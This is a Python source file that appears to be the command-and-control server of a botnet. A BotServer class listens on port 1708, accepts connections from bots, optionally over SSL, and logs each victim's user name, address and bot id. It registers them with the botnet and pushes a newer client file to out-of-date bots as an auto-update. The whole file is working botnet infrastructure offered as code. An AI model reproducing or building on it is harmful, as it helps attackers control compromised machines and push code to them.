from server import formatsock
from server.client import client
from server.botnetclasses import Bot

from threading import Thread
import signal
from distutils.version import LooseVersion
import json
import os
import socket
import ssl


MIN_CLIENT_VERSION = client.__version__


class BotServer(Thread):
    HOST = '0.0.0.0'
    PORT = 1708

    def __init__(self, botnet, socketio, certfile=None, keyfile=None):
        Thread.__init__(self)
        self.tcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.tcpsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.tcpsock.bind((BotServer.HOST, BotServer.PORT))

        self.botnet = botnet
        self.socketio = socketio
        self.clientversion = LooseVersion(MIN_CLIENT_VERSION)

        self.ssl = certfile and keyfile
        self.certfile = certfile
        self.keyfile = keyfile

        self.timeout_duration = 1

    def run(self):
        self.tcpsock.listen(5)
        while True:
            clientsock, (ip, port) = self.tcpsock.accept()
            clientsock.settimeout(1)
            try:
                print("[*] Accepting connection")
                print("\tSending SSL: "+('ON' if self.ssl else 'OFF'))
                clientsock.send(b'\x01' if self.ssl else b'\x00')
                if self.ssl:
                    print("\tWrapping socket...")
                    clientsock = ssl.wrap_socket(
                        clientsock,
                        server_side=True,
                        certfile=self.certfile,
                        keyfile=self.keyfile
                    )
                clientformatsock = formatsock.FormatSocket(clientsock)
                print('\tWaiting for client information...')
                msgbytes = clientformatsock.recv()
                host_info = json.loads(msgbytes.decode('UTF-8'))
                host_info['addr'] = ip

                user = host_info['user'].strip()
                botversion = LooseVersion(host_info['version'])

                if botversion < self.clientversion:
                    # Autoupdate
                    print("[*] Updating {} on version {}".format(user, botversion))
                    bot = Bot(clientsock, host_info, self.socketio)
                    bot.sendClientFile(open(os.path.abspath(client.__file__), 'rb'))
                else:
                    print("[+] Received connection from {} (id: {})".format(user,host_info['bid']))
                    self.botnet.addConnection(user, clientsock, host_info)
            except IOError as e:
                print("[!] Error accepting connection: {}".format(str(e)))
                try:
                    clientsock.close()
                except:
                    pass
